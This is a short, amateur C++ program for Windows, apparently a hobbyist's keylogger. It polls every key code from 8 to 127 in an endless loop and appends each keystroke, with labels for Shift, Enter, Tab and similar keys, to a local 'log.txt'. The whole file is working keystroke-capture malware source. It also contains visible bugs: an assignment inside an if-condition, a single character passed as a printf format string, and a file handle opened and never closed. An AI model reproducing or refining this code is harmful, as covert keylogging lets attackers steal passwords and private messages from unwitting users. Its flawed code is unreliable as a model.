#include <iostream>
#include <Windows.h>
#include <string>

int checkvkey(char bob, char * file) {

	FILE * logfile;
	logfile = fopen(file, "a+");
	//debug
	std::cout << bob;
	//debug
	if (bob == VK_SHIFT)
		fprintf(logfile, "%s", "[Shift]");
	else if (bob == VK_BACK)
		fprintf(logfile, "%s", "[Delete]");
	//else if (bob == VK_LBUTTON)
		//fprintf(logfile, "%s", "[LeftButton]");
	else if (bob == VK_RETURN)
		fprintf(logfile, "%s", "[Enter]");
	else if (bob == VK_ESCAPE)
		fprintf(logfile, "%s", "[ESC]");
	else if (bob == VK_CAPITAL)
		fprintf(logfile, "%s", "[CAPS]");
	else if (bob == VK_TAB)
		fprintf(logfile, "%s", "[TAB]");
	else
		fprintf(logfile, &bob); // accepts the value? Not quite sure
	fclose(logfile);
	return 0;
}

int savefile(char bob, char * file) {
	FILE * logfile;
	logfile = fopen(file, "a+"); // just like var = open(name, "mode")
	checkvkey(bob, file);
	return 0;
}

int main() {
	char key;
	while (true) {
		for (key=8; key <= 127; key++) // 8-127 is the ascii chart decimal numbers 127 is where the abc's end so that is where we put the scope.
			if (GetAsyncKeyState(key) == -32767) { 
				if (key = 0x5c)
					std::cout << "/"; // note ascii is fucked up Down key = ( so just use hex for special keys Look in ABOUT.TXT for more details
				savefile(key, "log.txt");

			}
	}

}
